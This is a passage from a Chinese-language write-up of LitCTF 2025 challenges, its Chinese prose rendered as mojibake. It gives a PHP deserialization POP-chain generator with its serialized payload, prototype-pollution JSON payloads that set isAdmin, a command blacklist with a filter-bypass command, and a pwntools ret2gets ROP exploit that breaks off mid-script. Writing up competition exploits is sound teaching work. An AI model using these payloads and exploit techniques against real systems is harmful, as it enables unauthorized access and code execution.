class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æŠŠOæ”¹æˆCä¸å°±è¡Œäº†å—,ç¬¨è›‹!ï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜†&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è´´ä¸ªç”Ÿæˆ payload çš„ä»£ç ï¼Œæ³¨æ„ï¼Œå¿…é¡»ç”¨<strong> 7.3.4</strong> ç‰ˆæœ¬çš„ php æ‰èƒ½ç”Ÿæˆ C å¼€å¤´çš„é“¾å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span> = <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thread</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kuchikamizake</span> = <span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;\000lambda_1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Mitsuha</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;musubi = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;thread = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;soul = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span></span><br></pre></td></tr></table></figure><p>â€‹ <code>create_function</code>  åˆ›å»ºçš„åŒ¿åå‡½æ•°å†…éƒ¨åç§°ä¸º  <code>\000lambda_1</code> ï¼ˆPHP å†…éƒ¨å‘½åè§„åˆ™ï¼Œ\000 æ˜¯ç§æœ‰å±æ€§æ ‡è¯†ï¼‰ï¼Œæ‰§è¡Œ  <code>die(</code> /readflag <code>)</code> ï¼›å½“ç„¶ï¼Œå¦‚æœæ‰§è¡Œè¿™ä¸ªä¹‹åå¤±è´¥äº†ï¼Œé‡å¯å®¹å™¨å¹¶ä¸”ä¸åˆ·æ–°é¡µé¢ç›´æ¥æ‰§è¡Œ payload çœ‹çœ‹ï¼Œå› ä¸ºæ¯ä¸€æ¬¡åˆ·æ–°åŒ¿åå‡½æ•°åå­—éƒ½ä¼šå˜ã€‚</p><blockquote><p>create_function åˆ›å»ºçš„åŒ¿åå‡½æ•°ï¼Œåœ¨ PHP å†…éƒ¨ä¼šè¢«å‘½åä¸º  <code>lambda_æ•°å­—</code> ï¼ˆç¬¬ä¸€ä¸ªåˆ›å»ºçš„æ˜¯ lambda_1ï¼‰ï¼Œä¸”åç§°å‰ç¼€å¸¦æœ‰ \000ï¼ˆç§æœ‰å±æ€§æ ‡è¯†ï¼‰ï¼Œå› æ­¤å¿…é¡»ç”¨ \000lambda_1 æ‰èƒ½æ­£ç¡®åŒ¹é…ã€‚</p></blockquote><p>â€‹å¤§æ¦‚çš„é“¾å­æ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>Taki::__unserialize â†’ Mitsuha::__invoke â†’ KatawareDoki::__toString â†’ Taki::__call â†’ åŒ¿åå‡½æ•°æ‰§è¡Œ /readflag</p></blockquote><p>â€‹æœ€åä¸€æ­¥ <code> (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</code>  å¯ä»¥é€šè¿‡åå°„è°ƒç”¨ <code>\000lambda_1</code> ï¼Œ</p><p>â€‹è¿™ä¸ªé¢˜å°±æœ€åä¸€æ­¥åå°„éœ€è¦è¯´ä¸‹ï¼Œæœ€åä¸€æ­¥åˆ°äº†é‚£é‡Œçš„æ—¶å€™ï¼Œå…¶é•¿ç›¸å·²ç»å˜æˆäº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;\000lambda_1&quot;</span>)-&gt;<span class="title function_ invoke__">invoke</span>();</span><br></pre></td></tr></table></figure><p>â€‹æœ€åçš„ invoke æ˜¯è¿›è¡Œæ‰§è¡Œçš„ï¼ŒåŠ äº†æ‰ä¼šæ­£å¼è°ƒç”¨ã€‚</p><h2 id="litctf-2025å¤šé‡å®‡å®™æ—¥è®°"><a class="markdownIt-Anchor" href="#litctf-2025å¤šé‡å®‡å®™æ—¥è®°">#</a> [LitCTF 2025] å¤šé‡å®‡å®™æ—¥è®°</h2><p>â€‹æç¤ºæ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œå…ˆæ³¨å†Œä¸ªè´¦å·è¿›å»çœ‹çœ‹ï¼Œç›´æ¥è¿›å»çœ‹åˆ°äº†ä¸ªç›´æ¥æäº¤ JSON çš„ç‚¹ï¼Œè®¿é—®æºç çœ‹åˆ°äº†æ›´æ–°é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ›´æ–°è¡¨å•çš„JSæäº¤</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;profileUpdateForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">            event.<span class="title function_">preventDefault</span>();</span><br><span class="line">            <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;updateStatus&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æ­£åœ¨æ›´æ–°...&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.<span class="property">target</span>);</span><br><span class="line">            <span class="keyword">const</span> settingsPayload = &#123;&#125;;</span><br><span class="line">            <span class="comment">// æ„å»º settings å¯¹è±¡ï¼ŒåªåŒ…å«æœ‰å€¼çš„å­—æ®µ</span></span><br><span class="line">            <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="property">theme</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>)) settingsPayload.<span class="property">language</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>);</span><br><span class="line">            <span class="comment">// ...å¯ä»¥æ·»åŠ å…¶ä»–å­—æ®µ</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">settings</span>: settingsPayload &#125;) <span class="comment">// åŒ…è£…åœ¨ &quot;settings&quot;é”®ä¸‹</span></span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æˆåŠŸ: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                    currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                    <span class="comment">// åˆ·æ–°é¡µé¢ä»¥æ›´æ–°å¯¼èˆªæ ï¼ˆå¦‚æœisAdminçŠ¶æ€æ”¹å˜ï¼‰</span></span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;é”™è¯¯: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;è¯·æ±‚å¤±è´¥: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="comment">// å‘é€åŸå§‹JSONçš„å‡½æ•°</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendRawJson</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> rawJson = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonSettings&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">            <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æ­£åœ¨å‘é€...&#x27;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> parsedJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawJson); <span class="comment">// ç¡®ä¿æ˜¯åˆæ³•çš„JSON</span></span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                    <span class="attr">headers</span>: &#123;</span><br><span class="line">                        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(parsedJson) <span class="comment">// ç›´æ¥å‘é€ç”¨æˆ·è¾“å…¥çš„JSON</span></span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;æˆåŠŸ: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                    currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                     <span class="comment">// åˆ·æ–°é¡µé¢ä»¥æ›´æ–°å¯¼èˆªæ ï¼ˆå¦‚æœisAdminçŠ¶æ€æ”¹å˜ï¼‰</span></span><br><span class="line">                    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    statusEl.<span class="property">textContent</span> = <span class="string">&#x27;é”™è¯¯: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                 statusEl.<span class="property">textContent</span> = <span class="string">&#x27;è¯·æ±‚å¤±è´¥æˆ–JSONæ— æ•ˆ: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨æ›´æ–°è®¾ç½®è¡¨å•é‡Œéšä¾¿è¾“å…¥å†…å®¹ï¼ŒæŠ“åŒ…å‘é€å‘ç°å‘çš„åŒ…æ˜¯ JSON æ ¼å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/profile/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span><span class="string">&quot;15&quot;</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>â€‹æ³¨é‡Šé‡Œæœ‰ä¸ªæç¤ºï¼Œæœ‰ä¸ªå‚æ•° <code>isAdmin</code>  å¯èƒ½æœ‰ç”¨ï¼Œä¸€èˆ¬ç”¨æˆ·çŒœæµ‹è¿™ä¸ªå‚æ•°ä¸º falseï¼Œé‚£ä¹ˆæ”¹ä¸º true åº”è¯¥å°±èƒ½è¿‡äº†å§ã€‚</p><p>â€‹payload å¦‚ä¸‹ï¼Œçœ‹äº†ä¸‹å¤§ä½¬ä»¬çš„ wpï¼Œè¿™ä¸ªä¼¼ä¹æ˜¯éé¢„æœŸã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/profile/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span><span class="string">&quot;15&quot;</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>â€‹é¢„æœŸè§£åº”è¯¥æ˜¯è¿™ä¸ªï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/profile/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">        <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">            <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span></span><br><span class="line"><span class="language-json">        <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json">    <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn</h1><h2 id="litctf-2025test_your_nc"><a class="markdownIt-Anchor" href="#litctf-2025test_your_nc">#</a> [LitCTF 2025]test_your_nc</h2><p>â€‹åç¼–è¯‘é™„ä»¶å¥½åƒç¼–è¯‘ä¸äº†ï¼Œä½†æ˜¯å­˜åœ¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seg000:000000000000001A                 db <span class="string">&#x27;print(&quot;input your command&quot;)&#x27;</span>,0Ah</span><br></pre></td></tr></table></figure><p>â€‹ä¼¼ä¹æ˜¯ä¸ª python ä»£ç ï¼Œç”¨æ–‡æœ¬æ–¹å¼æ‰“å¼€çœ‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure><p>â€‹å°±æ˜¯æ­£å¸¸è¿‡æ»¤å•Šï¼ŒWeb å¸¸è€ƒç‚¹ï¼Œç”¨ <code>ca''t$IFS$9f*</code>  å¯ä»¥è¯»å–åˆ° flagã€‚</p><h2 id="litctf-2025master_of_rop"><a class="markdownIt-Anchor" href="#litctf-2025master_of_rop">#</a> [LitCTF 2025]master_of_rop</h2><p>â€‹çœ‹çœ‹ä¿æŠ¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹æœ‰ NXï¼Œåç¼–è¯‘å¾ˆç®€å•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to LitCTF2025!&quot;</span>);</span><br><span class="line">  gets(v4, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ‰ ld å’Œ libc æ–‡ä»¶ï¼Œæ‰“ ret2getsï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">29371</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x4011AD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">attach(p, <span class="string">&#x27;b *0x4011D9&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to LitCTF2025!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(gets_plt) + p64(gets_plt)</span><br><span class="line">payload += p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;AAAA&quot;</span> + <span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x28c0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x10f75b</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span 